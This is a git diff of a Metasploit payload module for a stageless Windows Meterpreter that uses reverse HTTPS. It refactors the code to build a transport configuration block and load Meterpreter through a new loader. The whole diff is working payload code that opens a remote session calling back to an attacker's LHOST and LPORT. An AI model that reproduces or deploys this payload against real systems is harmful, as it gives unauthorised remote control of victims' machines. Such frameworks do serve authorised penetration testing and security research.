@@ -4,19 +4,22 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_https'
-require 'msf/core/payload/windows/stageless_meterpreter'
+require 'msf/core/payload/windows/meterpreter_loader'
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
-require 'rex/parser/x509_certificate'
+require 'rex/payloads/meterpreter/config'
 
-module Metasploit3
+module Metasploit4
 
-  CachedSize = :dynamic
+  CachedSize = 885314
 
-  include Msf::Payload::Windows::StagelessMeterpreter
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::Windows
+  include Msf::Payload::Single
+  include Msf::Payload::Windows::MeterpreterLoader
   include Msf::Sessions::MeterpreterOptions
-  include Msf::Payload::Windows::VerifySsl
 
   def initialize(info = {})
 
@@ -32,48 +35,36 @@ module Metasploit3
       ))
 
     register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
+      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
     ], self.class)
   end
 
   def generate
-    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
-    rand = Rex::Text.rand_text_alphanumeric(16)
-    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"
-
-    generate_stageless_meterpreter(url) do |dll|
-
-      # TODO: figure out this bit
-      # patch the target ID into the URI if specified
-      #if opts[:target_id]
-      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
-      #  if i
-      #    t = opts[:target_id].to_s
-      #    raise "Target ID must be less than 5 bytes" if t.length > 4
-      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
-      #    print_status("Patching Target ID #{t} into DLL")
-      #    dll[i, u.length] = u
-      #  end
-      #end
-
-      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                           datastore['HandlerSSLCert'])
-
-      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
-        :url            => url,
-        :ssl            => true,
-        :ssl_cert_hash  => verify_cert_hash,
-        :expiration     => datastore['SessionExpirationTimeout'].to_i,
-        :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
-        :ua             => datastore['MeterpreterUserAgent'],
-        :proxyhost      => datastore['PROXYHOST'],
-        :proxyport      => datastore['PROXYPORT'],
-        :proxy_type     => datastore['PROXY_TYPE'],
-        :proxy_username => datastore['PROXY_USERNAME'],
-        :proxy_password => datastore['PROXY_PASSWORD'])
-    end
-
+    stage_meterpreter(true) + generate_config
   end
 
-end
+  def generate_config(opts={})
+    unless opts[:uuid]
+      opts[:uuid] = Msf::Payload::UUID.new(
+        platform: 'windows',
+        arch:     ARCH_X86
+      )
+    end
 
+    # create the configuration block
+    config_opts = {
+      arch:       opts[:uuid].arch,
+      exitfunk:   datastore['EXITFUNC'],
+      expiration: datastore['SessionExpirationTimeout'].to_i,
+      uuid:       opts[:uuid],
+      transports: [transport_config_reverse_https(opts)],
+      extensions: (datastore['EXTENSIONS'] || '').split(',')
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
+  end
+end
